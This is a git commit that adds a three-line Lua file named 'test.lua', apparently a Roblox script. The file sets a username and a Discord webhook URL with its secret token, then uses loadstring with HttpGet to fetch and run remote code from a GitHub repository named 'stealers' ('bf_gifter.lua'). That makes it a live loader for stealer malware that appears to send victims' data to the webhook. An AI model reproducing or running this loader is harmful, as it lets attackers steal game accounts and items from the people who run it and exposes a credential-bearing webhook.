74a1c54089526d473a34258d2e47351aecd22ed4
KazakosMyBoy <vasilhskazakosbusiness@gmail.com>
2025-01-12 02:41:13 +0200

    Create test.lua

---
+++ test.lua
@@ -0,0 +1,3 @@
+Username = "NerfedModders" 
+Webhook = "https://discord.com/api/webhooks/1289315631921102951/F6z0oK2T0ySYI-iMWhl1habYZLC0-vOLT5N-d1T-WhJPhgi_t5OUiqwCKn1TYjt6u5SH" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/bf_gifter.lua"))()
